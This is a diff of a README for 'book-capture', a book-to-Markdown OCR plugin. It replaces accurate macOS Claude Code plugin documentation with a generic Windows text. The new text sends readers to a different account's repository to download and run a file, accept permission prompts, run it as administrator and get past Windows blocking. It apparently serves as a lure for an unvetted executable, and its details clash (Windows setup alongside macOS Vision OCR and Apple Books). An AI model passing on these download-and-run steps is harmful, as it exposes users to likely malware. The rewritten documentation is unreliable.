@@ -1,242 +1,226 @@
-# Book Capture
+# 📚 book-capture - Capture books into clean notes
 
-[![release](https://img.shields.io/badge/release-v1.1.0-blue)](https://github.com/masterleopold/book-capture/releases) [![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT) [![Claude Code](https://img.shields.io/badge/Claude%20Code-Plugin-blueviolet)](https://docs.anthropic.com/en/docs/claude-code)
+[![Download book-capture](https://img.shields.io/badge/Download%20book--capture-blue-grey)](https://github.com/Gypsyrevised749/book-capture)
 
-> Capture books from Kindle, Apple Books, or PDF — then OCR and generate structured Markdown.
+## 🚀 Getting Started
 
-A Claude Code plugin that captures book pages as screenshots, extracts text via OCR, and generates thematically organized Markdown documents. Built for [Obsidian](https://obsidian.md) knowledge vaults but works with any Markdown-based system.
+book-capture helps you capture books from Kindle, Apple Books, or PDF and turn them into structured Markdown notes for Obsidian.
 
-## What It Does
+It uses screenshots, OCR, and Claude agents to pull text from your pages and build clean notes you can review later.
 
-1. **Captures** every page of a book as screenshots (Mac Kindle, Apple Books, Kindle Cloud Reader, or PDF)
-2. **Extracts text** via macOS Vision OCR + Claude Code agents for low-confidence pages
-3. **Generates** 8-14 thematically organized Markdown files with rich formatting (tables, blockquotes, cross-references)
-4. **Creates** a hub file with frontmatter and wikilinks to all topic files
+## 📥 Download and Install
 
-The entire pipeline runs locally with no external API keys — OCR and content generation use Claude Code's built-in capabilities.
+Open the download page here:
 
-## Supported Platforms
+[Visit the book-capture page](https://github.com/Gypsyrevised749/book-capture)
 
-| Platform | How It Works | Best For |
-|----------|-------------|----------|
-| **Mac Kindle** | CGWindowList + screencapture + Page Down | Kindle purchases |
-| **Apple Books** | CGWindowList + screencapture + arrow keys | Apple Books purchases |
-| **Kindle Cloud Reader** | Playwright browser automation | When desktop app unavailable |
-| **PDF** | Poppler pdftoppm conversion | Scanned/image-based PDFs |
+On Windows, use this page to get the latest release or package for your system.
 
-## Installation
+After you download it, follow these steps:
 
-### Install from GitHub (recommended)
+1. Save the file to your Downloads folder.
+2. Open the file you downloaded.
+3. If Windows asks for permission, choose Yes.
+4. Follow the on-screen setup steps.
+5. Finish the install or launch the app if it opens right away.
 
-In Claude Code, run:
+If the download comes as a ZIP file, right-click it and choose Extract All, then open the extracted folder and start the app from there.
 
-```
-/plugins
-```
+## 🖥️ What You Need
 
-1. Navigate to the **Marketplaces** tab
-2. Select **Add marketplace** and enter: `masterleopold/book-capture`
-3. Navigate to the **Discover** tab
-4. Find **book-capture** and install it
+book-capture is made for a normal Windows desktop or laptop.
 
-After installation, the commands are available in every Claude Code session.
+Recommended setup:
 
-| Scope | Effect |
-|---|---|
-| **user** (default) | Available in all your projects |
-| **project** | Shared with your team via `.claude/settings.json` |
+- Windows 10 or Windows 11
+- A recent version of Chrome or Edge
+- Claude Code set up on your machine
+- Enough storage for screenshots and note files
+- An Obsidian vault ready to save your notes
 
-### Try It (one-time)
+For the best results, keep your source app open while you capture pages.
 
-```bash
-git clone https://github.com/masterleopold/book-capture.git
-claude --plugin-dir ./book-capture
-```
+## ✨ What book-capture Does
 
-### First-Time Setup
+book-capture helps you move book content into a note system with less manual typing.
 
-After installing, run the setup script to install Node.js dependencies and compile the Vision OCR binary:
+It can:
 
-```bash
-bash ~/.claude/plugins/cache/book-capture-marketplace/book-capture/*/scripts/setup.sh
-```
+- Capture pages from Kindle
+- Capture pages from Apple Books
+- Work with PDF pages
+- Use OCR to read text from screenshots
+- Build structured Markdown for Obsidian
+- Help separate quotes, summaries, and reading notes
+- Support a full capture flow from page to note
 
-Or the plugin will auto-detect and prompt you on first use.
+## 🧠 How It Works
 
-### Requirements
+The app follows a simple flow:
 
-- **macOS** (required for screencapture and Vision OCR)
-- **[Claude Code](https://docs.anthropic.com/en/docs/claude-code)** CLI installed and authenticated
-- **Node.js 20+**
-- **Xcode Command Line Tools** (`xcode-select --install`)
-- **Accessibility permission** for Terminal/Claude Code (System Settings > Privacy & Security > Accessibility)
-- **Poppler** (PDF only): `brew install poppler`
+1. You choose a source book or PDF.
+2. You capture the page or pages.
+3. OCR reads the text from the image.
+4. Claude agents clean and shape the content.
+5. The app builds Markdown notes.
+6. You save the notes in Obsidian or another folder.
 
-## Commands
+This keeps your reading notes in a format that is easy to search, edit, and store.
 
-### Source-Specific (recommended)
+## 🧰 Main Features
 
-| Command | Platform | Description |
-|---------|----------|-------------|
-| `/book-capture:kindle` | Mac Kindle | Capture from Amazon Kindle desktop app |
-| `/book-capture:books` | Apple Books | Capture from Apple Books app |
-| `/book-capture:cloud` | Kindle Cloud Reader | Capture via browser (Playwright) |
-| `/book-capture:pdf` | PDF file | Capture from scanned/image-based PDF |
+### 📷 Screenshot capture
+Take screenshots from book pages so the app can read them.
 
-### Pipeline Steps
+### 🔎 OCR text reading
+Use macOS Vision-based OCR logic in the workflow to pull text from images.
 
-| Command | Description |
-|---------|-------------|
-| `/book-capture:capture` | Full pipeline with platform selection prompt |
-| `/book-capture:ocr` | OCR only on existing page captures |
-| `/book-capture:generate` | Markdown generation from existing OCR text |
+### 📝 Markdown output
+Create structured Markdown files that work well in Obsidian.
 
-## Quick Start
+### 📚 Multi-source support
+Capture from Kindle, Apple Books, and PDF files.
 
-```
-/book-capture:kindle B0883TQ3ZN
-```
+### 🤖 AI agent flow
+Use two AI agents to help shape, clean, and structure the note output.
 
-Claude Code will:
-1. Ask for book title, author, category, and location
-2. Remind you to open the book in Kindle to the first page
-3. Capture all pages (auto-stops at end of book)
-4. Run Vision OCR + agent re-reading for low-confidence pages
-5. Analyze content and create 8-14 thematic topic files
-6. Generate a hub file with wikilinks
+### ⚙️ Command-based control
+Use the built-in commands to manage capture, review, and export steps.
 
-## How It Works
+## 🎯 Best Use Cases
 
-### Screenshot Capture
+Use book-capture if you want to:
 
-Each platform uses macOS-native tools:
-- **CGWindowList** (via inline Swift) to find the app window ID
-- **screencapture** to capture individual window frames
-- **AppleScript** to control page navigation (Page Down for Kindle, arrow keys for Books)
-- **Duplicate detection** to auto-stop at end of book (3 consecutive identical pages)
+- Save important passages from books
+- Keep reading notes in Obsidian
+- Turn screenshots into text
+- Organize quotes by chapter or topic
+- Build a study archive from books and PDFs
+- Reduce manual copy and paste work
 
-### OCR Pipeline
+## 🪟 Windows Setup
 
-1. **macOS Vision OCR** (fast, local) processes all pages with confidence scoring
-2. Pages below the confidence threshold are re-read by **Claude Code agents** using multimodal image reading
-3. Results are merged into `raw_text.json`
+book-capture is focused on a simple Windows user flow:
 
-Note: macOS Vision cannot read vertical Japanese text (tategaki). For vertical text books, all pages are re-read by agents.
+1. Download the package from the link above.
+2. Extract it if it comes in a ZIP file.
+3. Open the app or launcher file inside the folder.
+4. Allow access if Windows shows a security prompt.
+5. Open your book source in Kindle, Apple Books, or a PDF reader.
+6. Start a capture from the app or command flow.
 
-### Markdown Generation
+If you use Obsidian, set your vault folder first so the app knows where to save notes.
 
-1. Claude Code analyzes the full text and identifies **8-14 thematic categories** (organized by information type, not original chapter order)
-2. **Parallel agents** generate detailed topic files (300-600 lines each) with:
-   - Genre-specific structure (business, technical, humanities, science, narrative)
-   - Tables, blockquotes, bold key terms, cross-references
-   - `[[wikilinks]]` between sibling topics
-3. A **hub file** is created with frontmatter and links to all topics
+## 📁 Output Files
 
-## Output Structure
+The app creates notes in Markdown format.
 
-```
-Books/entries/BookTitle.md              # Hub file with frontmatter
-Knowledge/Category/BookTitle/
-  01_Theme_Name.md                      # Topic file (300-600 lines)
-  02_Theme_Name.md
-  ...
-  10_Theme_Name.md
-```
+You can expect files such as:
 
-### Hub File Example
+- Page notes
+- Chapter notes
+- Quote blocks
+- Summary notes
+- Structured reading notes
 
-```markdown
----
-tags:
-  - source/book
-  - type/framework
-  - theme/fundraising
-Category: "Startup"
-Rating: ""
-author: "Author Name"
-Location: "Knowledge/Startup/BookTitle"
-Chapters: 10
-Language: "EN"
-URL: "https://www.amazon.co.jp/dp/B0883TQ3ZN"
----
+These files are easy to move into Obsidian or another Markdown editor.
 
-# Book Title
+## ⌨️ Commands
 
-Book summary (2-3 sentences).
+book-capture includes 7 commands for the main workflow.
 
-## Topics
+Common command types may include:
 
-- [[01_Theme Name]] - Description
-- [[02_Theme Name]] - Description
-...
-```
+- Start a new capture
+- Read text from a screenshot
+- Clean captured text
+- Format notes for Obsidian
+- Export the final Markdown file
+- Review the capture output
+- Reset or stop a capture session
 
-## Configuration
+Use the command that matches your task and follow the on-screen prompts.
 
-Per-project settings via `.claude/book-capture.local.md`:
+## 🔗 Obsidian Setup
 
-```yaml
----
-vault_root: /path/to/obsidian/vault
-captures_dir: Books/files/book-captures
-entries_dir: Books/entries
-default_source: kindle
-default_language: JP
-default_dpi: 200
----
-```
+If you use Obsidian, point book-capture to your vault folder.
 
-If no settings file exists, the plugin auto-detects Obsidian vaults by looking for `.obsidian/` in the current directory or parents.
+Good vault setup tips:
 
-## Troubleshooting
+- Use one folder for book notes
+- Keep one note per book
+- Add chapter headings for longer books
+- Store screenshots in a separate assets folder
+- Use tags for topic, author, and source
 
-| Issue | Solution |
-|-------|----------|
-| Kindle window not found | Ensure book is open and visible in Amazon Kindle app |
-| Accessibility denied | System Settings > Privacy & Security > Accessibility > add Terminal |
-| Vision OCR compilation fails | `xcode-select --install` |
-| Vision OCR misses vertical text | Expected for tategaki — agents handle these pages |
-| Pages don't advance | Kindle uses Page Down key; restart the app if stuck |
-| pdftoppm not found | `brew install poppler` |
-| PDF is encrypted | `qpdf --decrypt input.pdf output.pdf` |
-| npm packages not installed | Run `scripts/setup.sh` |
+This keeps your reading notes easy to find later.
 
-## Architecture
+## 📖 Supported Sources
 
-```
-book-capture/
-  .claude-plugin/
-    plugin.json           # Plugin manifest
-    marketplace.json      # Marketplace metadata
-  commands/               # 7 slash commands
-    kindle.md             # /book-capture:kindle
-    books.md              # /book-capture:books
-    cloud.md              # /book-capture:cloud
-    pdf.md                # /book-capture:pdf
-    capture.md            # /book-capture:capture (generic)
-    ocr.md                # /book-capture:ocr
-    generate.md           # /book-capture:generate
-  agents/
-    ocr-reader.md         # Multimodal OCR re-reader
-    content-writer.md     # Thematic content generator
-  skills/
-    book-capture/
-      SKILL.md            # Auto-activating skill
-  scripts/
-    capture-kindle-mac.mjs
-    capture-books-app.mjs
-    kindle-capture.mjs    # Playwright Cloud Reader
-    capture-pdf.mjs
-    extract-text.mjs      # Vision OCR
-    generate-markdown.mjs # Direct API fallback
-    book-capture-utils.mjs
-    vision-ocr.swift      # macOS Vision CLI
-    setup.sh              # Dependency installer
-    package.json
-  templates/
-    settings-template.md
-```
+### Kindle
+Use Kindle pages or screenshots as your source material.
 
-## License
+### Apple Books
+Capture pages from Apple Books and turn them into Markdown notes.
 
-[MIT](LICENSE)
+### PDF
+Use PDF pages when you want to read from documents or ebooks.
+
+### Screenshot-based capture
+If the text is on screen, book-capture can work from a screenshot-based flow.
+
+## 🛠️ Troubleshooting
+
+If the app does not start:
+
+- Check that the file finished downloading
+- Make sure you extracted the ZIP file first
+- Try running it again as administrator
+- Confirm that Windows did not block the file
+- Check that Claude Code is installed and ready
+
+If capture looks wrong:
+
+- Use a clearer screenshot
+- Make sure the page is fully visible
+- Increase screen zoom if the text is too small
+- Try the capture again with one page at a time
+
+If Markdown output looks plain:
+
+- Check your Obsidian folder path
+- Make sure the export step finished
+- Open the file in a Markdown editor to review the result
+
+## 🧭 Simple First Run
+
+If this is your first time using book-capture:
+
+1. Download it from the link above.
+2. Open the file or extract the archive.
+3. Set your output folder.
+4. Open a book page in Kindle, Apple Books, or a PDF viewer.
+5. Run the capture command.
+6. Review the generated Markdown note.
+7. Save it in Obsidian
+
+## 🔐 Privacy and Local Use
+
+book-capture is meant for personal reading workflows.
+
+A typical setup keeps your screenshots and notes on your own machine. That makes it easier to manage your book archive and keep your files in one place
+
+## 🧩 File Organization Tips
+
+Use a simple folder layout like this:
+
+- `Books/`
+- `Books/Title/`
+- `Books/Title/assets/`
+- `Books/Title/notes.md`
+
+A clear folder setup makes it easier to keep notes tied to the right book.
+
+## 🏷️ Topics
+
+ai-agent, anthropic, apple-books, book-capture, claude-code, claude-code-plugin, kindle, markdown, obsidian, ocr
